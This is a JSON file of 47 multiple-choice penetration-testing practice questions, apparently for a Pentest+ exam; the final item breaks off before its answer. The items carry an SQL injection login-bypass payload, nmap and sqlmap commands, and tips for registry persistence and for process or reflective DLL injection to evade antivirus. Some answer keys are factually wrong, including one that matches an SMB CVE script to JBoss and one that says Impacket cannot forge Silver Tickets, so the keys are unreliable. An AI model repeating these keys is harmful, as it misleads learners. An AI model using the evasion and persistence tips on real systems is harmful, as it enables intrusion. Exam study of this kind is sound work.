{
  "category": "penplus",
  "testId": 4,
  "testName": "Pentest+ Practice Test #4 (Moderate)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "You intercept an NTLM authentication attempt and capture the following hash:\n\n```\nuser::domain:112233445566778899AABBCCDDEEFF:112233445566778899AABBCCDDEEFF::: \n```\n\nWhich of the following techniques would allow authentication with this hash without cracking it?",
      "options": [
        "Pass-the-Hash",
        "Rainbow Table Attack",
        "AS-REP Roasting",
        "Kerberoasting"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Pass-the-Hash (PtH) allows authentication by directly using the NTLM hash without needing to crack it. Rainbow table attacks are used to recover plaintext passwords. AS-REP Roasting and Kerberoasting target Kerberos authentication, not NTLM.",
      "examTip": "Pass-the-Hash allows lateral movement without knowing the actual password, making it effective in Windows environments."
    },
    {
      "id": 2,
      "question": "A penetration tester exploits a misconfigured Windows service and gains SYSTEM-level access. The tester wants to maintain persistent access even after a reboot. Which of the following is the MOST stealthy persistence method?",
      "options": [
        "Adding a new administrator account",
        "Injecting a DLL into `svchost.exe`",
        "Creating a scheduled task to run a reverse shell",
        "Modifying the Windows hosts file to redirect traffic"
      ],
      "correctAnswerIndex": 1,
      "explanation": "DLL injection into `svchost.exe` is the most stealthy method because it runs within a legitimate system process. Adding an admin account is easily detected. Scheduled tasks leave logs in the system. Modifying the hosts file does not ensure persistence.",
      "examTip": "Injecting into legitimate processes allows attackers to maintain persistence while blending in with normal activity."
    },
    {
      "id": 3,
      "question": "Which of the following Nmap commands would perform an **aggressive** scan that includes OS detection, service versioning, and NSE script execution?",
      "options": [
        "`nmap -sV -O -T4 target.com`",
        "`nmap -A target.com`",
        "`nmap -sC -sV target.com`",
        "`nmap -Pn -p- target.com`"
      ],
      "correctAnswerIndex": 1,
      "explanation": "`nmap -A` enables aggressive scanning, including OS detection, service versioning, and NSE script execution. `-sV -O -T4` lacks script execution. `-sC -sV` only runs default scripts but lacks OS detection. `-Pn -p-` scans all ports but does not provide detailed service information.",
      "examTip": "Use `nmap -A` for a full reconnaissance scan but be cautious as it generates significant traffic."
    },
    {
      "id": 4,
      "question": "A penetration tester performs SMB enumeration and identifies an account with weak credentials. Which attack would allow the tester to use these credentials to access another system without re-entering the password?",
      "options": [
        "NTLM Relay",
        "Golden Ticket Attack",
        "Pass-the-Ticket",
        "Kerberoasting"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Pass-the-Ticket allows an attacker to authenticate using a valid Kerberos ticket without re-entering credentials. NTLM Relay requires interaction with another system. Golden Ticket allows forging tickets but requires domain compromise. Kerberoasting extracts service account hashes.",
      "examTip": "Pass-the-Ticket attacks enable lateral movement by reusing valid Kerberos tickets."
    },
    {
      "id": 5,
      "question": "You are performing a web application test and intercept the following HTTP request:\n\n```\nPOST /api/user/login HTTP/1.1\nHost: app.target.com\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":\"' OR '1'='1\"}\n```\n\nWhat is the MOST likely outcome if the application is vulnerable?",
      "options": [
        "The request will be blocked by a firewall",
        "The server will execute arbitrary system commands",
        "Authentication will bypass and grant access",
        "The request will trigger a stored XSS payload"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The payload is an example of SQL Injection (`' OR '1'='1'`), which can bypass authentication if the application is vulnerable. Firewalls may not block it unless properly configured. Command execution requires Command Injection, not SQLi. Stored XSS involves JavaScript, which is not in this payload.",
      "examTip": "Always use parameterized queries to prevent SQL Injection."
    },
    {
      "id": 6,
      "question": "Which of the following tools would be MOST effective for enumerating Kerberos service accounts with weak passwords?",
      "options": [
        "Impacket",
        "Responder",
        "John the Ripper",
        "Hashcat"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Impacket is correct because it includes `GetUserSPNs.py`, which enumerates Kerberos service accounts for Kerberoasting attacks. Responder captures NTLM hashes, not Kerberos. John the Ripper and Hashcat crack passwords but do not enumerate accounts.",
      "examTip": "Use `GetUserSPNs.py` from Impacket to find service accounts vulnerable to Kerberoasting."
    },
    {
      "id": 7,
      "question": "A penetration tester needs to test for vulnerable JBoss servers on a target network. Which Nmap script would be the MOST useful?",
      "options": [
        "`nmap --script=http-vuln-cve2009-3103 -p 8080 target`",
        "`nmap --script=vulners -p 80 target`",
        "`nmap -sC -sV -p 443 target`",
        "`nmap --script=smb-enum-shares -p 445 target`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`http-vuln-cve2009-3103` is an Nmap script specifically for detecting vulnerable JBoss servers. `vulners` checks for general vulnerabilities but not JBoss-specific ones. `-sC -sV` gathers information but does not check for CVEs. `smb-enum-shares` is for SMB enumeration, not web server exploits.",
      "examTip": "Use targeted Nmap scripts for specific vulnerabilities rather than relying on general scans."
    },
    {
      "id": 8,
      "question": "Which payload encoding technique is MOST effective at evading signature-based intrusion detection systems (IDS)?",
      "options": [
        "Base64 encoding",
        "Polymorphic shellcode",
        "Hex encoding",
        "URL encoding"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Polymorphic shellcode is correct because it continuously modifies itself to evade signature-based detection. Base64, Hex, and URL encoding can be easily decoded and detected.",
      "examTip": "Polymorphic shellcode modifies its structure while maintaining functionality, making it harder to detect."
    },
    {
      "id": 9,
      "question": "You are reviewing the configuration of an Apache web server. Which directive within the `httpd.conf` or `.htaccess` file is MOST directly related to preventing directory listing?",
      "options": [
        "ServerSignature Off",
        "Options -Indexes",
        "AllowOverride None",
        "Require all granted"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The `Options -Indexes` directive disables directory listing, preventing the web server from displaying a list of files if a directory is requested without a default index file (e.g., index.html). `ServerSignature Off` hides server information. `AllowOverride None` restricts the use of `.htaccess` files. `Require all granted` (in Apache 2.4) allows access.",
      "examTip": "`Options -Indexes` = Disable directory listing (Apache)."
    },
    {
      "id": 10,
      "question": "Examine the following Nmap command: `nmap -sU -p 53 192.168.1.1`\nWhat is this command doing?",
      "options": [
        "Performing a TCP SYN scan on port 53.",
        "Performing a UDP scan on port 53.",
        "Performing a TCP connect scan on port 53.",
        "Performing a ping sweep."
      ],
      "correctAnswerIndex": 1,
      "explanation": "`nmap -sU` specifies a UDP scan. `-p 53` targets port 53 (commonly used for DNS). It's not a TCP SYN scan (-sS), a TCP connect scan (-sT), or a ping sweep.",
      "examTip": "`nmap -sU` = UDP scan."
    },
    {
      "id": 11,
      "question": "A penetration tester intercepts an HTTP response containing the following header:\n\n```\nSet-Cookie: sessionid=abc123; HttpOnly; Secure;\n```\n\nWhich attack is MITIGATED by this configuration?",
      "options": [
        "Cross-site scripting (XSS)",
        "Session fixation",
        "SQL injection",
        "Clickjacking"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `HttpOnly` attribute prevents JavaScript from accessing cookies, mitigating XSS attacks that attempt to steal session tokens. Session fixation requires additional protections. SQL injection targets databases, not cookies. Clickjacking manipulates UI elements, which is unrelated.",
      "examTip": "Always enable `HttpOnly` and `Secure` attributes to protect session cookies from theft."
    },
    {
      "id": 12,
      "question": "You are analyzing a Linux system and find the following SUID binary:\n\n```\n-rwsr-xr-x 1 root root 16000 Feb 23 10:15 /usr/bin/customapp\n```\n\nWhat is the PRIMARY risk associated with this binary?",
      "options": [
        "It allows unauthorized users to execute root commands.",
        "It can be exploited using a buffer overflow attack.",
        "It exposes system logs to unprivileged users.",
        "It allows users to modify kernel parameters."
      ],
      "correctAnswerIndex": 0,
      "explanation": "SUID binaries run with the privileges of the file owner (often root), which can be exploited if misconfigured. While buffer overflows may exist, the primary risk is privilege escalation. Exposing logs or modifying kernel parameters would require additional vulnerabilities.",
      "examTip": "Use `find / -perm -4000 -type f 2>/dev/null` to identify potentially exploitable SUID binaries."
    },
    {
      "id": 13,
      "question": "Which tool would a penetration tester use to generate a Silver Ticket attack against a Windows Active Directory environment?",
      "options": [
        "Mimikatz",
        "Responder",
        "Impacket",
        "BloodHound"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Mimikatz can generate Silver Tickets, which allow attackers to forge Kerberos service tickets. Responder captures authentication requests but does not generate tickets. Impacket includes Kerberos tools but does not generate Silver Tickets. BloodHound maps AD relationships but does not forge tickets.",
      "examTip": "Silver Tickets allow attackers to forge Kerberos service tickets without needing domain controller access."
    },
    {
      "id": 14,
      "question": "A penetration tester runs the following command:\n\n```\nnmap --script=ssl-heartbleed -p 443 target.com\n```\n\nWhat is the tester attempting to exploit?",
      "options": [
        "An outdated TLS cipher suite",
        "A buffer over-read vulnerability in OpenSSL",
        "A weak SSL certificate configuration",
        "A man-in-the-middle vulnerability in HTTPS"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The `ssl-heartbleed` script checks for the Heartbleed vulnerability, which allows memory leaks due to a buffer over-read flaw in OpenSSL. Weak ciphers affect encryption strength but are not related. SSL certificate misconfigurations affect trust but are unrelated to Heartbleed. MITM attacks require network-level interception.",
      "examTip": "Heartbleed allows attackers to extract sensitive data from memory, including passwords and encryption keys."
    },
    {
      "id": 15,
      "question": "Which of the following techniques allows an attacker to modify the execution flow of a running process by injecting malicious code?",
      "options": [
        "Process hollowing",
        "DLL sideloading",
        "Kerberoasting",
        "Heap spraying"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Process hollowing replaces the memory of a legitimate process with malicious code, allowing stealthy execution. DLL sideloading exploits how Windows loads DLLs. Kerberoasting extracts service account hashes. Heap spraying manipulates memory but does not hijack process execution.",
      "examTip": "Process hollowing is commonly used by malware to run malicious payloads within trusted processes."
    },
    {
      "id": 16,
      "question": "A penetration tester captures the following Kerberos authentication request:\n\n```\nUser: service_account\nRequest: TGS-REQ\nService: HTTP/webserver.target.com\n```\n\nWhat attack is the tester likely preparing for?",
      "options": [
        "Kerberoasting",
        "AS-REP Roasting",
        "Pass-the-Ticket",
        "Golden Ticket Attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Kerberoasting involves requesting a service ticket (`TGS-REQ`) for a service account and cracking its hash offline. AS-REP Roasting targets users without preauthentication. Pass-the-Ticket uses existing Kerberos tickets but does not require cracking. Golden Ticket attacks forge tickets using a compromised domain controller.",
      "examTip": "Use `GetUserSPNs.py` from Impacket to extract service tickets for Kerberoasting."
    },
    {
      "id": 17,
      "question": "Which of the following scenarios is a sign of a DNS rebinding attack?",
      "options": [
        "A web application unexpectedly connects to internal network hosts",
        "A large number of NXDOMAIN responses appear in DNS logs",
        "Multiple DNS queries are made for non-existent subdomains",
        "A host frequently changes its IP address in DNS responses"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DNS rebinding tricks a browser into making requests to internal systems by resolving a malicious domain to an internal IP. NXDOMAIN responses indicate subdomain enumeration. Rapid IP changes are common in load balancing but not specific to rebinding.",
      "examTip": "Use browser security features like `Access-Control-Allow-Origin` to mitigate DNS rebinding attacks."
    },
    {
      "id": 18,
      "question": "Which payload technique would be MOST effective in bypassing antivirus detection?",
      "options": [
        "Reflective DLL injection",
        "Encoding payloads with Base64",
        "Using a standard Metasploit payload",
        "Executing a plaintext PowerShell script"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Reflective DLL injection loads malicious code directly into memory without writing to disk, making it stealthier. Base64 encoding can be decoded easily. Standard Metasploit payloads are well known to antivirus tools. Plaintext PowerShell scripts are easily detected.",
      "examTip": "Reflective DLL injection is a common fileless attack technique used to evade antivirus detection."
    },
    {
      "id": 19,
      "question": "A penetration tester is attempting to crack a WPA2 Wi-Fi handshake. Which attack technique would be the MOST effective?",
      "options": [
        "Using a precomputed PMK dictionary",
        "Launching a KRACK attack",
        "Performing an Evil Twin attack",
        "Flooding the AP with deauthentication frames"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A precomputed Pairwise Master Key (PMK) dictionary attack is the most efficient way to crack a WPA2 handshake. KRACK exploits key reinstallation but does not recover passwords. Evil Twin attacks trick users into connecting but do not crack WPA2. Deauth flooding forces clients to reconnect but does not recover keys.",
      "examTip": "Use `aircrack-ng` with a strong wordlist to crack captured WPA2 handshakes."
    },
    {
      "id": 20,
      "question": "Which of the following methods is commonly used to establish persistence on a compromised Windows system?",
      "options": [
        "Adding a startup entry in the Windows registry",
        "Performing an ARP poisoning attack",
        "Injecting SQL commands into a login form",
        "Using an Evil Twin attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Adding a registry startup entry ensures persistence across reboots. ARP poisoning manipulates network traffic but does not establish persistence. SQL injection targets databases, not system access. Evil Twin attacks capture credentials but do not maintain persistence.",
      "examTip": "Use `reg add` commands to modify Windows startup registry keys for persistence."
    },
    {
      "id": 21,
      "question": "A penetration tester is analyzing a compromised Windows system and executes the following command:\n\n```\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n```\n\nWhat is the MOST likely purpose of this action?",
      "options": [
        "To check for stored user credentials in registry keys",
        "To list programs that execute on system startup",
        "To verify installed security patches for persistence mechanisms",
        "To enumerate installed third-party software for exploitation"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Querying `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` lists programs configured to start at boot, which can reveal persistence mechanisms. User credentials are typically stored in `HKLM\\Security` or `HKLM\\SAM`, not `Run`. Checking security patches requires different registry paths. Enumerating installed third-party software is useful but not the primary intent of this query.",
      "examTip": "Registry Run keys are commonly abused for persistence; check them when investigating system modifications."
    },
    {
      "id": 22,
      "question": "A penetration tester captures an SMB authentication request containing an NTLM hash but notices that it cannot be relayed successfully. What is the MOST likely reason for this?",
      "options": [
        "The target system has SMB signing enforced",
        "The attacker failed to obtain an NTLMv2 response",
        "The password hash has been salted with a unique per-user value",
        "The Kerberos authentication protocol is being used instead of NTLM"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SMB signing prevents NTLM relay attacks by cryptographically verifying the authenticity of messages. NTLMv2 does not prevent relaying but makes cracking hashes harder. NTLM hashes are not salted per-user. Kerberos is an alternative authentication method but does not explain why NTLM relay failed.",
      "examTip": "SMB signing disrupts NTLM relay attacks; always check if it's enforced before attempting relays."
    },
    {
      "id": 23,
      "question": "A penetration tester is testing a web application and finds that the following request bypasses authentication:\n\n```\nGET /admin?auth=false HTTP/1.1\nHost: target.com\n```\n\nWhich security flaw is MOST likely present?",
      "options": [
        "Improper input validation allowing parameter tampering",
        "Weak encryption on session tokens",
        "Session fixation due to predictable authentication tokens",
        "Insufficient Transport Layer Security (TLS) enforcement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The issue here is improper input validation, allowing attackers to tamper with parameters to bypass authentication. Weak session token encryption affects confidentiality, not authentication bypass. Session fixation involves forcing a session ID onto a user, which is unrelated here. TLS enforcement ensures secure transmission but does not prevent logic-based authentication flaws.",
      "examTip": "Parameter tampering occurs when authentication mechanisms trust user-supplied values without verification."
    },
    {
      "id": 24,
      "question": "A penetration tester is conducting an internal network assessment and discovers a host with port **3389 (RDP)** open. What would be the MOST effective next step?",
      "options": [
        "Perform an NTLM relay attack using captured hashes",
        "Check for weak or default RDP credentials via brute-force",
        "Analyze the RDP server for known CVEs and exploit them",
        "Intercept and modify RDP traffic using a man-in-the-middle attack"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Analyzing the RDP server for vulnerabilities is the most effective next step, as RDP exploits (e.g., BlueKeep) can provide direct access. NTLM relay is ineffective unless SMB signing is disabled. Brute-force attacks can be noisy and detected. MITM attacks against RDP require special conditions (e.g., weak encryption configurations).",
      "examTip": "Always check for known vulnerabilities (e.g., BlueKeep) before attempting brute-force or relay attacks."
    },
    {
      "id": 25,
      "question": "A penetration tester is analyzing a MySQL database and executes the following query:\n\n```\nSELECT user, host FROM mysql.user WHERE password = '';\n```\n\nWhat is the tester attempting to identify?",
      "options": [
        "Accounts with weak password hashes",
        "Default accounts with no password set",
        "Users with expired credentials",
        "Misconfigured access control lists (ACLs)"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The query returns MySQL users with empty passwords, which are default accounts or misconfigured user entries. Weak password hashes would require extracting hashes first. Expired credentials are managed differently. ACL misconfigurations affect access rights, not stored passwords.",
      "examTip": "Always check for default or empty-password accounts in databases, as they are common misconfigurations."
    },
    {
      "id": 26,
      "question": "During an external penetration test, a tester identifies a web application running on port **8443**. What is the MOST likely service running on this port?",
      "options": [
        "A Tomcat or Java-based web application",
        "A misconfigured SSH server",
        "An exposed SMB service",
        "A legacy FTP server using an alternate port"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Port 8443 is commonly used by Tomcat and Java-based web applications for HTTPS services. SSH typically runs on 22, SMB on 445, and FTP on 21 or 990 for FTPS.",
      "examTip": "If a web application is running on **8443**, check for exposed Tomcat or Java-based services."
    },
    {
      "id": 27,
      "question": "Which of the following techniques allows an attacker to escalate privileges on a Windows system by exploiting a vulnerable service running as SYSTEM?",
      "options": [
        "Unquoted service path exploitation",
        "Kerberoasting",
        "Pass-the-Ticket attack",
        "NTLM relay"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unquoted service path exploitation occurs when a service path with spaces lacks quotation marks, allowing privilege escalation. Kerberoasting targets Kerberos service accounts. Pass-the-Ticket reuses Kerberos tickets for lateral movement. NTLM relay exploits authentication but does not escalate local privileges.",
      "examTip": "Check for unquoted service paths in Windows using `wmic service get name,displayname,pathname`."
    },
    {
      "id": 28,
      "question": "Which of the following attack techniques is MOST effective for capturing plaintext FTP credentials?",
      "options": [
        "Intercepting traffic using Wireshark",
        "Exploiting anonymous FTP access",
        "Brute-forcing FTP login attempts",
        "Launching an Evil Twin Wi-Fi attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Intercepting traffic with Wireshark is correct because FTP transmits credentials in plaintext. Anonymous FTP access may expose files but not credentials. Brute-forcing may work but does not guarantee success. Evil Twin attacks target wireless networks, not FTP traffic.",
      "examTip": "Since FTP transmits credentials in plaintext, use packet sniffing tools like Wireshark to capture them."
    },
    {
      "id": 29,
      "question": "A penetration tester performing reconnaissance identifies a domain with a `DMARC` record set to `p=none`. What is the security implication?",
      "options": [
        "Email spoofing attacks can be performed without restrictions",
        "The domain is vulnerable to DNS cache poisoning",
        "Users can access the email server without authentication",
        "The web application is at risk of session fixation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`p=none` in DMARC means that email spoofing is not prevented, allowing phishing attacks. DNS cache poisoning affects DNS records, not email. Authentication settings are unrelated. Session fixation impacts web applications, not email security.",
      "examTip": "A weak DMARC policy (`p=none`) allows attackers to spoof emails from the domain."
    },
    {
      "id": 30,
      "question": "You are performing a penetration test and discover a web application that appears to be vulnerable to SQL injection. You want to use sqlmap to automate the exploitation process. Which sqlmap command is MOST appropriate to identify the database management system (DBMS) being used?",
      "options": [
        "sqlmap -u \"http://example.com/page.php?id=1\" --dbs",
        "sqlmap -u \"http://example.com/page.php?id=1\" --banner",
        "sqlmap -u \"http://example.com/page.php?id=1\" --tables",
        "sqlmap -u \"http://example.com/page.php?id=1\" --dump"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The `--banner` option in sqlmap attempts to retrieve the database banner, which often reveals the DBMS type and version. `--dbs` lists databases, `--tables` lists tables within a database, and `--dump` extracts data.",
      "examTip": "sqlmap --banner = Retrieve DBMS information."
    },
    {
      "id": 31,
      "question": "A penetration tester intercepts the following DNS query during a network assessment:\n\n```\nnslookup -type=TXT _dmarc.target.com\n```\n\nWhat information is the tester attempting to gather?",
      "options": [
        "The target's SPF policy for email validation",
        "DMARC policy settings for email spoofing protection",
        "The private key for DKIM-signed emails",
        "DNS records for subdomain enumeration"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Querying `_dmarc.target.com` retrieves the DMARC policy, which defines how the domain handles email spoofing attempts. SPF (`-type=TXT target.com`) validates sending mail servers. DKIM private keys are never publicly available. Subdomain enumeration requires different queries like `AXFR` or `Amass`.",
      "examTip": "Weak DMARC policies (`p=none`) allow spoofed emails to be sent without restrictions."
    },
    {
      "id": 32,
      "question": "A penetration tester exploits a vulnerable web application and uploads a malicious PHP web shell. The tester accesses the shell and executes:\n\n```\nwhoami\n```\n\nThe response is:\n\n```\nwww-data\n```\n\nWhat is the NEXT logical step to escalate privileges?",
      "options": [
        "Search for writable SUID binaries",
        "Attempt to crack the root password",
        "Modify the system's `/etc/shadow` file",
        "Use SQL injection to elevate privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Since `www-data` is a low-privileged web user, the best step is checking for misconfigured SUID binaries that allow privilege escalation. Cracking root passwords is inefficient. `/etc/shadow` requires root access. SQL injection does not help escalate local system privileges.",
      "examTip": "Privilege escalation on Linux often involves SUID binaries, writable system files, or kernel exploits."
    },
    {
      "id": 33,
      "question": "A penetration tester captures the following response from a web application:\n\n```\nHTTP/1.1 302 Found\nLocation: /dashboard\nSet-Cookie: sessionid=abc123; HttpOnly; Secure;\n```\n\nWhich attack would still be possible against this session management mechanism?",
      "options": [
        "Session hijacking via network sniffing",
        "JavaScript-based session theft",
        "Session fixation through predictable tokens",
        "Session replay attack"
      ],
      "correctAnswerIndex": 3,
      "explanation": "Session replay attacks are possible if tokens do not expire properly. `HttpOnly` prevents JavaScript-based theft. Secure flag protects against network sniffing (if HTTPS is enforced). Session fixation requires predictable or weak session management, which is not indicated here.",
      "examTip": "Session tokens should be short-lived and tied to user authentication to prevent replay attacks."
    },
    {
      "id": 34,
      "question": "Which of the following techniques is commonly used to bypass Windows Defender?",
      "options": [
        "Encoding payloads in Base64",
        "Injecting shellcode into a remote process",
        "Running PowerShell scripts from disk",
        "Executing known Metasploit payloads"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Process injection allows shellcode to execute within trusted processes, bypassing Defender. Base64 encoding does not prevent detection once decoded. Running scripts from disk increases the chance of detection. Metasploit payloads are well-known and flagged.",
      "examTip": "Use reflective DLL injection or process hollowing to execute payloads while avoiding detection."
    },
    {
      "id": 35,
      "question": "Which of the following is a primary risk associated with improperly configured wildcard DNS records?",
      "options": [
        "Increased likelihood of domain hijacking",
        "Exposure of internal services via subdomain enumeration",
        "Elevation of privileges through authentication bypass",
        "Susceptibility to Kerberoasting attacks"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Wildcard DNS records (`*.target.com`) can lead to subdomain takeovers, exposing internal services. Domain hijacking typically results from weak registrar controls. Authentication bypass is unrelated. Kerberoasting targets Active Directory service accounts, not DNS misconfigurations.",
      "examTip": "Wildcard DNS records can allow attackers to create or discover unintended subdomains for exploitation."
    },
    {
      "id": 36,
      "question": "A penetration tester is reviewing Active Directory settings and finds that LDAP signing is disabled. What risk does this pose?",
      "options": [
        "Allows Kerberos ticket reuse attacks",
        "Enables unauthorized directory modifications",
        "Permits NTLM relay attacks against LDAP services",
        "Exposes password hashes over cleartext protocols"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Disabling LDAP signing allows NTLM relay attacks by failing to cryptographically sign LDAP traffic. Kerberos ticket reuse requires weak TGT management. Unauthorized modifications require write privileges. Cleartext password transmission is mitigated using LDAPS, not LDAP signing.",
      "examTip": "Always enforce LDAP signing to prevent NTLM relay attacks against Active Directory."
    },
    {
      "id": 37,
      "question": "A penetration tester discovers an application vulnerable to XML External Entity (XXE) attacks. Which of the following would be the BEST way to exploit this vulnerability?",
      "options": [
        "Injecting an XML entity to retrieve local system files",
        "Executing JavaScript to steal authentication tokens",
        "Performing SQL injection to extract database contents",
        "Using NTLM relaying to escalate privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "XXE vulnerabilities allow attackers to retrieve local files through maliciously crafted XML input. JavaScript execution is related to XSS, not XXE. SQL injection targets databases, while NTLM relaying exploits authentication, neither of which are XXE-related.",
      "examTip": "XXE attacks can leak sensitive files by using entity expansion and external references."
    },
    {
      "id": 38,
      "question": "A penetration tester is scanning a target network and identifies an exposed Redis service on port **6379**. What is the MOST likely security risk?",
      "options": [
        "The service may allow unauthenticated remote command execution",
        "It may contain unpatched SMB vulnerabilities",
        "The system may be vulnerable to NTLM relay attacks",
        "It may expose plaintext password hashes in transit"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Redis by default does not require authentication, allowing attackers to execute remote commands. SMB vulnerabilities exist on port 445, not 6379. NTLM relay attacks occur over SMB, LDAP, or HTTP. Redis does not transmit authentication data in plaintext unless misconfigured.",
      "examTip": "If Redis is exposed, check for misconfigurations that allow remote code execution or data manipulation."
    },
    {
      "id": 39,
      "question": "Which of the following is a common attack technique against Docker containers?",
      "options": [
        "Escaping to the host system using a privileged container",
        "Performing SMB enumeration over exposed ports",
        "Brute-forcing the container registry login",
        "Using a stolen Kerberos ticket to authenticate"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Docker escapes occur when attackers exploit a misconfigured or privileged container to execute commands on the host. SMB enumeration is unrelated to Docker. Brute-forcing registry credentials is possible but not the primary risk. Kerberos is used in Active Directory, not container environments.",
      "examTip": "Always use least privilege for Docker containers to prevent host escapes."
    },
    {
      "id": 40,
      "question": "A penetration tester is analyzing a web server and finds that it is vulnerable to Server-Side Request Forgery (SSRF). What is a common impact of this vulnerability?",
      "options": [
        "Accessing internal resources from an external attacker",
        "Executing arbitrary SQL queries on the database",
        "Capturing user credentials via phishing attacks",
        "Gaining full remote code execution on the server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SSRF allows attackers to make requests on behalf of the server, potentially accessing internal resources. SQL injection involves manipulating database queries. Phishing is unrelated to SSRF. Remote code execution requires additional flaws beyond SSRF alone.",
      "examTip": "SSRF can be used to access internal services or metadata APIs in cloud environments."
    },
    {
      "id": 41,
      "question": "A penetration tester captures an HTTP response containing the following header:\n\n```\nSet-Cookie: sessionid=xyz123; Secure; SameSite=Strict\n```\n\nWhich attack is still possible despite this configuration?",
      "options": [
        "Session hijacking via MITM",
        "Cross-Site Request Forgery (CSRF)",
        "Session fixation via cookie manipulation",
        "SQL injection targeting authentication logic"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The `SameSite=Strict` attribute helps prevent CSRF, and `Secure` protects against MITM if HTTPS is used. However, session fixation is still possible if session tokens are predictable or not properly rotated upon login. SQL injection is unrelated to session management.",
      "examTip": "To prevent session fixation, ensure that session tokens are regenerated upon authentication."
    },
    {
      "id": 42,
      "question": "A penetration tester is analyzing a network and identifies an LLMNR/NBT-NS request for a non-existent hostname. What would be the MOST effective way to exploit this?",
      "options": [
        "Perform an SMB relay attack using captured NTLM hashes",
        "Conduct an ARP poisoning attack to intercept credentials",
        "Use Kerberoasting to extract service account hashes",
        "Inject a malicious DLL into a running system process"
      ],
      "correctAnswerIndex": 0,
      "explanation": "LLMNR/NBT-NS spoofing allows attackers to capture NTLM hashes, which can then be relayed to authenticate against SMB services. ARP poisoning manipulates local traffic but does not exploit LLMNR. Kerberoasting targets Kerberos service accounts, not LLMNR. DLL injection is unrelated to this attack.",
      "examTip": "LLMNR/NBT-NS attacks are effective in networks without SMB signing enabled."
    },
    {
      "id": 43,
      "question": "A penetration tester uploads a PHP web shell to a server and attempts to execute system commands, but they fail. Which mitigation is MOST likely preventing execution?",
      "options": [
        "Web Application Firewall (WAF) filtering",
        "File Integrity Monitoring (FIM)",
        "PHP `disable_functions` restrictions",
        "Content Security Policy (CSP) rules"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The `disable_functions` directive in PHP restricts execution of dangerous functions like `system()` and `exec()`. WAF filtering blocks malicious requests but does not prevent execution post-upload. FIM detects file modifications but does not block execution. CSP is for client-side security, not backend execution.",
      "examTip": "PHP security settings like `disable_functions` should always be reviewed when testing web shells."
    },
    {
      "id": 44,
      "question": "A penetration tester finds an exposed `.git` directory on a web server. What is the MOST significant risk?",
      "options": [
        "Attackers can retrieve source code and configuration files",
        "An attacker can directly execute commands on the server",
        "User credentials can be extracted via NTLM relay",
        "The server is vulnerable to directory traversal attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "An exposed `.git` directory allows attackers to download the repository, which may contain credentials, API keys, or configuration files. It does not allow direct command execution unless a vulnerable script is included. NTLM relay is unrelated to Git exposure. Directory traversal is different from direct repository access.",
      "examTip": "Always check for exposed `.git` directories during web application testing, as they can leak sensitive information."
    },
    {
      "id": 45,
      "question": "A penetration tester captures network traffic and finds the following HTTP request:\n\n```\nGET /admin/dashboard HTTP/1.1\nHost: target.com\nAuthorization: Basic dXNlcjpwYXNzd29yZA==\n```\n\nWhat is the MOST significant security issue in this request?",
      "options": [
        "The credentials are transmitted in a reversible format",
        "The request lacks an encryption mechanism",
        "The request does not include multifactor authentication",
        "The session ID is exposed in plaintext"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Basic authentication encodes credentials in Base64, which is easily reversible. The lack of encryption is an issue, but the main problem is the reversible credential format. MFA is unrelated to the transmission method. No session ID is present in this request.",
      "examTip": "Basic authentication should be replaced with token-based or OAuth authentication for security."
    },
    {
      "id": 46,
      "question": "A penetration tester is reviewing a compromised Linux system and runs the following command:\n\n```\nfind / -perm -4000 2>/dev/null\n```\n\nWhat is the tester attempting to find?",
      "options": [
        "Writable files that can be modified by any user",
        "Processes running as root",
        "SUID binaries that may allow privilege escalation",
        "Open ports that can be exploited for remote access"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The `find / -perm -4000` command searches for SUID binaries, which execute with elevated privileges and may be exploited. Writable files are found with `-perm -o+w`. Running processes are listed using `ps`. Open ports are identified using `netstat` or `ss`.",
      "examTip": "SUID binaries are a common privilege escalation vector; always check for misconfigured ones."
    },
    {
      "id": 47,
      "question": "A penetration tester is performing a social engineering attack and sends a phishing email containing a malicious link. Which of the following techniques could be used to evade email security filters?",
      "options": [
        "Encoding the URL with hex or Base64",
        "Embedding JavaScript to obfuscate payload execution",
        "Using an OpenID Connect (OIDC) attack",
        "Injecting an iframe with an external phishing form"
      ],
      "correctAnswerIndex": 0,
